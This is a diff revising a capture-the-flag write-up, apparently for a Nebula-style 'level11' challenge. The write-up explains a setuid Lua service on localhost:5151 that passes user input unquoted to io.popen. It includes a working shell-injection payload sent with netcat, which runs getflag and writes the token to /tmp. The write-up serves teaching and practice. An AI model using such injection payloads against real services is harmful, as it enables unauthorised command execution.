@@ -13,14 +13,14 @@
 	.bash_logout  .bashrc  .profile  level11.lua
 	```
 
-3. __Action__ (Guest): check the permissions of the `level11.lua` file
+3. __Action__ (Guest): check the file access control list of the `level11.lua` file
 	```sh
 	getfacl level11.lua
 	```
 
 4. __Observation__ (Guest): the previous command reveals that the `level11.lua` file:
-	- is owned by the `flag11` user
 	- is readable by the `level11` user
+	- is owned by the `flag11` user
 	- has the `setuid` bit set
 	```
 	# file: level11.lua
@@ -37,13 +37,13 @@
 	cat level11.lua
 	```
 
-6. __Observation__ (Guest): the previous command reveals that the `level11.lua` file
-	contains a Lua script that listens on `localhost:5151` and asks for a password upon connection.
+6. __Observation__ (Guest): the previous command reveals that the `level11.lua` file is a Lua script
+	that listens on `localhost:5151` and asks for a password upon connection.
 	Then the script hashes the provided password with a custom `hash` function, and compares
 	the result with a hardcoded hash value. The interesting part is that the `hash` function
-	invokes shell commands via the `io.popen` function, which is a security risk. And because
-	it passes the user input directly to the shell, and unquoted, it is possible to inject
-	shell commands.
+	invokes shell commands via the `io.popen` function, which is a security vulnerability.
+	And because it passes the user input directly to the shell, and unquoted,
+	it is possible to inject shell commands.
 	```lua
 	#!/usr/bin/env lua
 
@@ -84,13 +84,13 @@
 7. __Action__ (Guest): connect to localhost on port 5151 to make a shell command injection
 	via a malicious password
 	```sh
-	echo '$( getflag | grep -oE "[^ ]+$" >/tmp/token )' | nc localhost 5151 >/dev/null
+	echo '$( getflag | egrep -o "[^ ]+$" >/tmp/token )' | nc localhost 5151 >/dev/null
 	```
 
 8. __Action__ (Guest): check if the `token` file has been correctly created
 	and contains the wanted token
 	```sh
-	cat /tmp/token || echo 'File does not exist'
+	cat /tmp/token
 	```
 
 9. __Observation__ (Guest): the previous command reveals that the file has been created,
